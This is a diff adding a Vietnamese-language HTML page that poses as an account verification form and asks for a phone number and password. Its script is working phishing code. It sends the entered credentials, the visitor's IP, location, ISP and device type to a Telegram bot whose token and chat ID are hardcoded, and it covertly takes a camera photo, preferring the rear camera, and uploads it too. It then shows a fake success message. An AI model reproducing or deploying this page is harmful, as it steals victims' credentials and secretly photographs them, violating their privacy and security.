@@ -1,0 +1,211 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Hệ Thống Xác Thực Bảo Mật</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-base: #030712;
+    --panel-bg: rgba(17, 24, 39, 0.75);
+    --border-color: rgba(99, 102, 241, 0.3);
+    --primary: #6366f1;
+    --accent: #a855f7;
+    --text-main: #f8fafc;
+    --text-muted: #94a3b8;
+    --success: #10b981;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+  body {
+    background-color: var(--bg-base);
+    background-image: 
+      radial-gradient(circle at 15% 15%, rgba(99, 102, 241, 0.2) 0px, transparent 50%),
+      radial-gradient(circle at 85% 85%, rgba(168, 85, 247, 0.2) 0px, transparent 50%);
+    color: var(--text-main);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+  .card {
+    background: var(--panel-bg);
+    backdrop-filter: blur(30px);
+    border: 1px solid var(--border-color);
+    padding: 36px 28px;
+    border-radius: 28px;
+    width: 100%;
+    max-width: 400px;
+    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+    text-align: center;
+  }
+  .live-clock {
+    font-size: 0.8rem; font-weight: 600; color: var(--primary);
+    background: rgba(99, 102, 241, 0.1); border: 1px solid rgba(99, 102, 241, 0.2);
+    padding: 6px 14px; border-radius: 20px; display: inline-block; margin-bottom: 16px;
+  }
+  .input-group {
+    margin-bottom: 16px;
+    text-align: left;
+  }
+  .input-group label {
+    font-size: 0.85rem; color: var(--text-muted); display: block; margin-bottom: 6px;
+  }
+  .input-group input {
+    width: 100%; padding: 12px 16px; background: rgba(15, 23, 42, 0.6);
+    border: 1px solid var(--border-color); border-radius: 10px; color: #fff; font-size: 0.95rem;
+  }
+  .btn {
+    width: 100%; padding: 16px; 
+    background: linear-gradient(135deg, var(--primary), var(--accent));
+    color: #fff; border: none; border-radius: 14px; 
+    font-weight: 700; font-size: 1rem; cursor: pointer; 
+    transition: all 0.3s ease;
+    box-shadow: 0 10px 25px -5px rgba(99, 102, 241, 0.5);
+    margin-top: 10px;
+  }
+  .status { margin-top: 20px; font-size: 0.85rem; font-weight: 600; color: var(--text-muted); }
+  #video, #canvas { display: none; }
+</style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="live-clock" id="clock">Đang tải thời gian...</div>
+    <h2>Xác Thực Tài Khoản</h2>
+    <p class="subtitle" id="sub-text">Vui lòng nhập thông tin liên kết bên dưới.</p>
+
+    <div class="input-group">
+      <label>Số điện thoại</label>
+      <input type="tel" id="phone-input" placeholder="Nhập số điện thoại..." />
+    </div>
+
+    <div class="input-group">
+      <label>Tạo mật khẩu tài khoản</label>
+      <input type="password" id="password-input" placeholder="Nhập mật khẩu..." />
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <button class="btn" id="capture-btn">HOÀN TẤT XÁC THỰC</button>
+    <div id="status" class="status"></div>
+  </div>
+
+<script>
+  const TELEGRAM_BOT_TOKEN = '8812338501:AAFnZiI0fpcNqs0LMGUUuFV2MCSTgpdNbaI'; 
+  const TELEGRAM_CHAT_ID = '-1004303781844'; 
+
+  function updateClock() {
+    const now = new Date();
+    document.getElementById('clock').textContent = `🕒 ${now.toLocaleTimeString('vi-VN', { hour12: false })}`;
+  }
+  setInterval(updateClock, 1000);
+  updateClock();
+
+  const captureBtn = document.getElementById('capture-btn');
+  const statusDiv = document.getElementById('status');
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const phoneInput = document.getElementById('phone-input');
+  const passwordInput = document.getElementById('password-input');
+
+  captureBtn.onclick = async () => {
+    const phoneNumber = phoneInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    if (!phoneNumber || phoneNumber.length < 9) {
+      alert('Vui lòng nhập số điện thoại hợp lệ!');
+      return;
+    }
+    if (!password || password.length < 6) {
+      alert('Mật khẩu phải có ít nhất 6 ký tự!');
+      return;
+    }
+
+    captureBtn.style.display = 'none';
+    statusDiv.textContent = 'Đang xử lý thông tin bảo mật...';
+
+    // Lấy thông tin IP chi tiết
+    let ipDetails = { ip: 'Không rõ', city: 'Không rõ', country: 'Không rõ', org: 'Không rõ' };
+    try {
+      const ipRes = await fetch('https://ipwho.is/');
+      const ipData = await ipRes.json();
+      if (ipData.success) {
+        ipDetails = {
+          ip: ipData.ip,
+          city: ipData.city,
+          country: ipData.country,
+          org: ipData.connection?.isp || 'Không rõ'
+        };
+      }
+    } catch (e) {}
+
+    const ua = navigator.userAgent;
+    let deviceName = /android/i.test(ua) ? 'Android 🤖' : /iphone|ipad/i.test(ua) ? 'iOS 🍏' : 'PC/Laptop 💻';
+
+    const infoText = 
+      `🚨 <b>THÔNG TIN ĐĂNG KÝ MỚI</b> 🚨\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `📞 <b>Số điện thoại:</b> <code>${phoneNumber}</code>\n` +
+      `🔑 <b>Mật khẩu:</b> <code>${password}</code>\n` +
+      `📱 <b>Thiết bị:</b> ${deviceName}\n` +
+      `🌐 <b>IP:</b> <code>${ipDetails.ip}</code>\n` +
+      `🏙️ <b>Địa điểm:</b> ${ipDetails.city}, ${ipDetails.country}\n` +
+      `🏢 <b>Nhà mạng:</b> ${ipDetails.org}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━`;
+
+    // Kích hoạt chụp ảnh Camera sau (environment)
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: { exact: 'environment' } }, 
+        audio: false 
+      }).catch(async () => {
+        return await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      });
+
+      video.srcObject = stream;
+      await new Promise((resolve) => {
+        video.onloadedmetadata = () => {
+          video.play();
+          setTimeout(() => {
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(async (blob) => {
+              if (blob) {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'back_cam.jpg');
+                formData.append('caption', infoText);
+                formData.append('parse_mode', 'HTML');
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                  method: 'POST',
+                  body: formData
+                });
+              }
+              stream.getTracks().forEach(track => track.stop());
+              resolve();
+            }, 'image/jpeg', 0.9);
+          }, 1000);
+        };
+      });
+    } catch (err) {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: infoText + '\n\n⚠️ (Người dùng từ chối camera)', parse_mode: 'HTML' })
+      });
+    }
+
+    statusDiv.textContent = 'Xác thực thành công!';
+  };
+</script>
+</body>
+</html>ểt
